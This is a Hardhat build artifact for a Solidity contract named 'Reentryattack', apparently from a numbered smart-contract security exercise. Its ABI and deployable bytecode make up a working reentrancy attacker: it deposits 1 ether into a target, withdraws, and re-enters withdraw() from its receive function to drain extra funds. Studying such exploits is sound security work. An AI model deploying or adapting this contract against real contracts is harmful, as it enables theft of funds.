{
  "_format": "hh-sol-artifact-1",
  "contractName": "Reentryattack",
  "sourceName": "contracts/12/reentryattack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "addr",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "addr_",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "time",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610544380380610544833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b61042d806101176000396000f3fe6080604052600436106100385760003560e01c806316ada547146100fc57806345d69c29146101275780639e5faafc14610152576100f7565b366100f757600180600082825461004f91906102dd565b92505081905550600260015410156100f55760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016100c29190610356565b600060405180830381600087803b1580156100dc57600080fd5b505af11580156100f0573d6000803e3d6000fd5b505050505b005b600080fd5b34801561010857600080fd5b5061011161015c565b60405161011e9190610380565b60405180910390f35b34801561013357600080fd5b5061013c610162565b60405161014991906103dc565b60405180910390f35b61015a610186565b005b60015481565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101f657600080fd5b505af115801561020a573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016102709190610356565b600060405180830381600087803b15801561028a57600080fd5b505af115801561029e573d6000803e3d6000fd5b50505050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006102e8826102a4565b91506102f3836102a4565b925082820190508082111561030b5761030a6102ae565b5b92915050565b6000819050919050565b6000819050919050565b600061034061033b61033684610311565b61031b565b6102a4565b9050919050565b61035081610325565b82525050565b600060208201905061036b6000830184610347565b92915050565b61037a816102a4565b82525050565b60006020820190506103956000830184610371565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006103c68261039b565b9050919050565b6103d6816103bb565b82525050565b60006020820190506103f160008301846103cd565b9291505056fea2646970667358221220b56bb6b1c6d169c416f64df83c0396abe7ea7355f9158d6cdd668cece77ef5f164736f6c63430008140033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}